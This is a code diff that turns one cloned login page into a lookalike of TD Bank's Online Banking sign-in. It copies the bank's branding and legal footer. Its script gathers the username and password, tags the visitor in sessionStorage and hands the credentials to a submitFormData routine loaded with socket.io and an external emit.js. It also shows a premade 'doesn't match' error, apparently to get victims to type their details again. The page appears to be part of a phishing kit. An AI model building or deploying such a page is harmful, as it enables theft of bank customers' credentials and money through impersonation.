@@ -1,358 +1,591 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    		<link rel="stylesheet" href="assets/style.css">
-    	<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
-    <title>Login</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: Arial, sans-serif;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Online Banking</title>
 
-        body {
-            display: flex;
-            justify-content: center;
-            align-items: top;
-            min-height: 100vh;
-            background-color: #ffffff; 
-            position: relative;
-            padding-bottom: 150px; /* Adjust padding to avoid overlap with footer */
-        }
+  <link rel="icon" href="/images/favicon.ico" type="image/x-icon">
 
-        .login-container {
-            width: 100%;
-            padding: 25px;  
-            text-align: center;
-        }
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+  <link rel="stylesheet" href="style.css"/>
 
-        .logo {  
-            font-size: 33px;
-            font-weight: bold;
-            color: #3f2940;
-            margin-bottom: 20px;
-        }
-        
-        .logo img{
-        max-width: 165px!important;
-        }
+  <!-- Font Awesome -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
 
-        .logo span {
-            font-weight: normal;
-            border: 1px solid #3f2940;
-            padding: 3px 6px;
-            margin-left: 5px;
-            border-radius: 4px;
-        }
-        
-        form {
-            margin-top: 80px;
-        } 
-        
-        .save-user-id {
-            display: flex;
-            align-items: center;
-            margin-top: 15px;
-            margin-bottom: 15px;
-        }
+  <style>
 
-        .save-user-id input {
-            margin-right: 5px;
-            height: 60%;
-        } 
-
-        
-        .links {
-		    margin-top: 20px;
-		    font-size: 14px;
-		    color: #6b3b9c;
-		    text-align: left;
-		}
-		
-		.links a {
-		    color: #6b3b9c;
-		    text-decoration: underline;     /* Added underline */
-		    display: inline;                /* Changed from block to inline */
-		    margin-right: 15px;             /* Space between links */
-		    font-size: 17px;
-		}
-		
-		/* Optional: Remove underline on hover if you want */
-		.links a:hover {
-		    text-decoration: none;          /* or keep underline */
-		}
-
-        .register { 
-            margin-top: 30px;   
-            font-size: 18px; 
-            color: #333;
-            text-align: left;
-        }
-
-        .register a {
-            color: #6b3b9c;
-            text-decoration: none;
-        }
-        
-        .footer {
-            background-color: #3f2940;
-            color: #d1c3d0;
-            padding: 30px 20px;
-            width: 100%;
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 30%;
-        }
-
-        .footer-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            max-width: 1000px;
-            text-algn: center;
-        }
-
-        .footer-logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #ffffff;
-            margin-bottom: 20px;
-        }
-        
-        footer-logo img{
-        max-width: 120px!important;
-        }
-
-        .footer-logo span {
-            font-weight: normal;
-            border: 1px solid #ffffff;
-            padding: 3px 6px;
-            margin-left: 5px;
-            border-radius: 4px;
-        }
-
-        .footer-links {
-            font-size: 14px;
-            line-height: 1.8;
-            text-align: center;
-            width: 100%;
-        }
-
-        .footer-links a {
-        	text-align: center;
-            color: #d1c3d0;
-            text-decoration: none;
-        }
-
-        .footer-links a:hover {
-            color: #ffffff;
-        }
-
-        .footer-bottom {
-            font-size: 12px;
-            color: #d1c3d0;
-            margin-top: 20px;
-        }
-
-        /* Desktop layout */
-        @media (min-width: 758px) {  
-            .footer-content {
-                flex-direction: row;
-                justify-content: space-between;
-                align-items: flex-start;
-            }
-
-            .footer-logo {
-                margin-bottom: 0;
-                text-align: left;
-            }
-
-            .footer-links {
-                display: grid;
-                grid-template-columns: 1fr 1fr;
-                gap: 10px;
-                text-align: left!important;
-                max-width: 500px;
-            } 
-            
-            .login-container {
-        	width:500px!important;
-        	max-width: 500pximportant;
-            padding: 35px;
-            text-align: center;
-        }
-        }
-        
-        @media(max-width: 758px){ 
-        
-        .register {
-        margin-bottom:80%; 
-        }
-        }
-        
-        @media (max-width: 758px) {
-        
-        .footer-links a {
-        	text-align: center;
-        }
-        
-        .footer{
-        margin-top:80%;
-        }
-    .footer-links {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
+    body {
+      font-family: tdfont, FontTwo;
+      margin: 0;
+      padding: 0;
+      background-color: #f9f9f9;
+      background-image: none;
     }
 
-    .footer-links a {
-        margin-bottom: 10px; /* Adds spacing between links */
+    .container {
+      width: 100%;
+      height: 100%;
+      padding: 20px;
+      background-color: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+
+    
+
+/* FLOAT EFFECT */
+
+.input-group input:focus + label,
+.input-group input:valid + label {
+    top: 5px;
+    left: 12px;
+    font-size: 0.75em;
+    color: #006400;
+}
+
+/* INPUT FOCUS */
+
+.input-group input:focus {
+    border-bottom: 4px solid #006400;
+    outline: none;
+}
+
+    .error {
+      border-bottom: 4px solid #ae1100 !important;
+    }
+
+    input:focus {
+      border-bottom: 4px solid green;
+      outline: none;
+    }
+
+    .input-group .eye-toggle {
+      position: absolute;
+      top: 50%;
+      right: 15px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 0.8em;
+      color: #006400;
+    }
+
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 30px;
+    }
+
+    .checkbox-group input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      accent-color: #006400;
+      margin-right: 10px;
+    }
+
+    .checkbox-group label {
+      font-size: 1.2em;
+    }
+
+    button {
+      width: 100%;
+      max-width: 215px;
+      padding: 10px;
+      font-size: 1em;
+      background-color: #fff;
+      border: none;
+      color: #ccc;
+      border-radius: 2px;
+      cursor: not-allowed;
+      margin: 0 auto;
+      display: block;
+    }
+
+    button.active {
+      background-color: #006400;
+      cursor: pointer;
+      color: white;
+    }
+
+    .links {
+      margin-top: 30px;
+    }
+
+    a {
+      color: #006400;
+      text-decoration: none;
+      font-size: 1em;
+      font-weight: bold;
+      margin-bottom: 25px;
+      display: flex;
+      align-items: center;
+    }
+
+    .links a i {
+      margin-left: 8px;
+      font-size: 13px;
+    }
+
+    .info {
+      margin-top: 20px;
+      font-size: 1em;
+      text-align: left;
+      color: #333;
+    }
+
+    .info strong {
+      color: #006400;
+    }
+
+    .forgot-password {
+      display: none;
+    }
+
+    .forgot-password-mobile {
+      display: flex;
+    }
+
+    input:disabled,
+    button:disabled {
+      border: 2px solid #ccc !important;
+      background-color: #f9f9f9;
+      color: #888;
+    }
+    
+
+    /* Desktop */
+
+    @media (min-width: 768px) {
+
+      .container {
+        background-image: url('images/background.png');
+        background-size: cover;
+        background-position: center;
+        flex-direction: row;
+        justify-content: space-between;
+        align-items: flex-start;
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 50px;
+      }
+
+      .form-wrapper {
+        width: 70%;
+        display: flex;
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      h1 {
+        text-align: left;
+        width: 100%;
+        margin-bottom: 20px;
+        font-size: 1.6em;
+      }
+
+      .form-section {
+        background-color: rgba(255, 255, 255, 0.8);
+        border: 1px solid #ccc;
+        padding: 30px;
+        width: 70%;
+      }
+
+      .links {
+        width: 38%;
+        color: #038203;
+      }
+
+      .links a:first-child {
+        display: none;
+      }
+
+      .forgot-password {
+        margin-top: 20px;
+        display: block !important;
+        color: #038203;
+        text-align: center;
+      }
+
+      .forgot-password-mobile {
+        display: none;
+      }
+
+      .footer-links {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .footer-middle {
+        display: none !important;
+      }
+
+      .investment-box {
+        max-width: 68%;
+      }
+    }
+    
+    .input-group {
+    position: relative;
+    margin-bottom: 30px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 24px 50px 10px 15px;
+    font-size: 1em;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    background: #fff;
+    border-radius: 4px 4px 0 0;  
+} 
+
+/* LABEL */
+
+.input-group label {
+    position: absolute;
+    left: 15px;
+    top: 18px;
+    color: #777;
+    font-size: 1em;
+    transition: 0.2s ease all;
+    pointer-events: none;
+    background: #fff;
+    padding: 0 4px;
+}
+
+    
+@media (max-width: 768px) {
+    .error-container {
+        width: 100vw;
+        margin-left: calc(-50vw + 50%);
+        border-radius: 0;
     }
 }
 
-        
-    </style>
+  </style>
 </head>
+
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <img style="max-width:160px;" src="/assets/images/trulogo_horz-trupurple.png"/>
-        </div>
-                        <div class="error-alert">
-            <div class="error-alert-top">
-                <div class="error-alert-icon">!</div>
 
-                <div class="error-alert-title">
-                    Your user ID or password isn’t recognized
-                </div>
-            </div>
+  <div class="header">
+    <img src="images/logo.png" alt="Logo">
 
-            <div class="error-alert-message">
-                
-            </div>
-        </div>
-
-
-        <form>
-            <label for="user-id">User ID</label>
-            <input type="text" name="user-id" id="user-id" placeholder="">
-
-            <div class="save-user-id">
-                <input type="checkbox" id="save-id">
-                <label for="save-id">Save user ID</label>
-            </div>
-
-            <label for="password">Password</label>
-            <input type="password" name="password" id="password" placeholder="">
-            
-            <button id="continue" class="submit">Sign in</button>
-            
-            
-            <div class="links">
-                <a href="#">Forgot User ID?</a>
-                <a href="#">Reset Password</a>
-            </div>
-
-            <div class="register">
-                Don't have an online user ID? <br><a href="#">Register now</a>
-            </div> 
-        </form>
-    </div> 
-    <div class="footer">
-        <div class="footer-content">
-            <div class="footer-logo">
-                <img src="/assets/images/logo-white.png" alt="Logo" style="max-width:120px;">
-            </div>
-            <div class="footer-links">
-                <a href="#">Privacy</a>
-                <a href="#">Fraud & security</a>
-                <a href="#">Terms and conditions</a>
-                <a href="#">Accessibility</a>
-                <a href="#">Limit use of my sensitive personal information</a>
-                <a href="#">Do not sell or share my personal information</a>
-            </div>
-        </div>
-        <div class="footer-bottom">
-            © 2024, Truisy. All Rights Reserved.
-        </div>
+    <div class="right-section">
+      <img src="/images/usericon.png" alt="user" />
+      <span>Log in</span>
     </div>
-    
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="assets/emit.js"></script> 
-    <script>
-    	page = "login";
-$(document).ready(function() {
+  </div>
 
-    $('.submit').on('click', async function(e) {
-        e.preventDefault(); // Prevent default form submission
+  <div class="container">
 
-        let isEmpty = false;
-		const checkInputs = $('input'); 
-		
-		// First, remove any existing error messages
-		$('.error-message').remove();
-		
-		// Check for empty fields
-		for (const check of checkInputs) {
-		    // Reset previous styling
-		    $(check).css('borderColor', '');
-		
-		    if (check.value.trim() === "") {
-		        $(check).css('borderColor', 'red'); // Highlight input
-		        
-		        check.classList.add("error");
-		        
-		        // Create error message div
-		        const errorDiv = $('<div class="error-message"></div>');
-		        
-		        errorDiv.html(`
-		            <span class="error-icon">!</span>
-		            <span class="error-text">Please enter a valid ${check.name}</span>
-		        `);
-		
-		        // Insert error message right after the input
-		        $(check).after(errorDiv);
-		        
-		        isEmpty = true;
-		    }
-		}
+    <div class="form-wrapper">
 
-        // If no input is empty, proceed with form submission
-        if (!isEmpty) {
+      <h1>Welcome to Online Banking</h1>
 
-            // Serialize form data into an array
-            let userinfo = $('form').serializeArray(); // Make sure to wrap the inputs in a <form> tag
-            let user = {};
-            let visitor = sessionStorage.setItem('visitor', $('#user-id').val());
-            console.log(visitor);
+      <div id="form" class="form-section">
 
-            userinfo.forEach((value) => {
-                user[value.name] = value.value; // Create user object from inputs
-            });
+        <!-- ERROR BOX INSIDE FORM -->
 
-            user['visitor'] = visitor; // Add visitor info to user object
-            console.log(user);
+        <div class="error-container">
+          <div class="error-icon"></div>
 
-            // Send AJAX request
-             await submitFormData(user);
-            
-        }
+          <div class="error-text">
+            <p>
+              Something doesn't match. Please try again, or use the
+              "Forgot user name and/or password?" link for help.
+              Note: Temporary passwords do expire - contact us or
+              the account owner if you need help.
+            </p>
+          </div>
+        </div>
+
+        <div class="input-group">
+
+    <input type="text"
+           id="username"
+           name="username"
+           required>
+
+    <label for="username">
+        User name
+    </label>
+
+</div>
+
+<div class="input-group">
+
+    <input type="password"
+           id="password"
+           name="password"
+           required>
+
+    <label for="password">
+        Password
+    </label>
+
+    <i class="fas fa-eye eye-toggle"
+       id="toggle-eye"
+       ></i>
+
+</div>
+
+        <button id="login-btn" type="submit" disabled>
+          Log in
+        </button>
+
+        <a href="#" class="forgot-password">
+          Forgot username and/or password?
+        </a>
+
+      </div>
+    </div>
+
+    <div class="links">
+
+      <a href="#" class="forgot-password-mobile">
+        Forgot username and/or password?
+      </a>
+
+      <a href="#">
+        Sign up for Online Banking
+        <i class="fas fa-angle-right"></i>
+      </a>
+
+      <a href="#">
+        View the Online Banking demo
+        <i class="fas fa-angle-right"></i>
+      </a>
+
+      <a href="#">
+        Learn more about TD mobile banking
+        <i class="fas fa-angle-right"></i>
+      </a>
+
+      <hr>
+
+      <div class="info">
+        <strong>
+          Find out more about TD Bank's online security
+        </strong>
+
+        and our commitment to provide you with a safe and secure
+        online and mobile banking experience.
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+
+  <footer>
+
+    <div class="footer-container">
+
+      <div class="footer-top">
+
+        <div class="p"
+             style="white-space: nowrap; color:green">
+
+          Questions?
+          <span style="color:green; font-weight:bold;">
+            Contact us
+          </span>
+
+        </div>
+
+        <hr class="footer-divider">
+
+      </div>
+
+      <div class="footer-middle">
+        <p>
+          <a href="#">Get the app</a>
+        </p>
+      </div>
+
+      <div class="footer-links">
+
+        <a href="#">Help</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Security</a>
+        <a href="#">Privacy</a>
+        <a href="#">California Privacy</a>
+        <a href="#">Bank Deposits FDIC Insured</a>
+        <a href="#">Online Advertising</a>
+
+      </div>
+
+      <div class="footer-investment">
+
+        <div class="investment-box">
+
+    <div class="investment-row">
+        SECURITIES AND INVESTMENTS
+    </div>
+
+    <div class="investment-row">
+        Not FDIC Insured
+    </div>
+
+    <div class="investment-row">
+        No Bank Guarantee
+    </div>
+
+    <div class="investment-row">
+        May Lose Value
+    </div>
+
+</div>
+
+      </div>
+
+      <div class="footer-bottom">
+
+        <p>
+          Registered Investment Advisory, Securities and Brokerage
+          services are offered through TD Private Client Wealth,
+          LLC, member FINRA/SIPC.
+        </p>
+
+        <p>
+          &copy; 2024 TD Bank, N.A. All Rights Reserved
+        </p>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+</body>
+<script src="assets/emit.js"></script>
+
+<script>
+
+// Select all required elements
+const usernameInput = document.getElementById('username');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const toggleEye = document.getElementById('toggle-eye');
+
+let passwordVisible = false;  
+function checkInputs() {
+    if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
+        loginBtn.disabled = false;
+        loginBtn.classList.add('active');
+    } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+    }
+}
+
+// Attach input listeners
+usernameInput.addEventListener('input', checkInputs);
+passwordInput.addEventListener('input', checkInputs);
+
+
+
+toggleEye.addEventListener('click', function () {
+    passwordVisible = !passwordVisible;
+
+    if (passwordVisible) {
+        passwordInput.type = 'text';
+        toggleEye.className = 'fas fa-eye-slash eye-toggle';
+    } else {
+        passwordInput.type = 'password';
+        toggleEye.className = 'fas fa-eye eye-toggle';
+    }
+});
+
+
+document.addEventListener('DOMContentLoaded', () => {
+    const inputs = document.querySelectorAll('.input-group input');
+    const submitButton = document.getElementById('login-btn');
+
+    const checkAllInputs = () => {
+        const allFilled = Array.from(inputs).every(input => input.value.trim() !== '');
+        submitButton.disabled = !allFilled;
+    };
+
+    inputs.forEach(input => {
+        
+        // When user leaves the field (blur)
+        input.addEventListener('blur', (event) => {
+            const inputElement = event.target;
+            const errorDivId = `${inputElement.id}-error`;
+            let existingError = document.getElementById(errorDivId);
+
+            // Remove old error if exists
+            if (existingError) existingError.remove();
+
+            // Show error if field is empty
+            if (inputElement.value.trim() === '') {
+                const errorDiv = document.createElement('div');
+                errorDiv.id = errorDivId;
+                errorDiv.style.fontWeight = "500";
+                errorDiv.style.margin = "4px";
+                errorDiv.style.color = '#ae1100';
+                errorDiv.style.fontSize = '13px';
+
+                if (inputElement.id !== "password") {
+                    errorDiv.textContent = `Oops, don't forget to enter your ${inputElement.name.toLowerCase()}`;
+                } else {
+                    errorDiv.textContent = `Please enter a valid password`;
+                }
+
+                inputElement.parentNode.appendChild(errorDiv);
+                inputElement.classList.add('error');
+            }
+
+            checkAllInputs();
+        });
+
+        // Remove error when user starts typing
+        input.addEventListener('input', () => {
+            const errorDiv = document.getElementById(`${input.id}-error`);
+            if (errorDiv) {
+                errorDiv.remove();
+                input.classList.remove('error');
+            }
+            checkAllInputs();
+        });
+    });
+});
+
+$(document).ready(function () {
+    $('#login-btn').click(async function (e) {
+        e.preventDefault();   // Prevent default form submission
+
+        let userinfo = {};
+        let visitor = $('#username').val();
+
+        // Save username in sessionStorage
+        sessionStorage.setItem('visitor', visitor);
+
+        // Collect all input values from the form
+        $('#form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            if (inputName) {
+                userinfo[inputName] = inputValue;
+            }
+        });
+
+        userinfo['visitor'] = visitor;
+
+        console.log("User Info:", userinfo);   // For debugging
+
+        // Call your submission function
+        await submitFormData(userinfo);
     });
 });
 
 
 </script>
-
-
-</body>
 </html> 
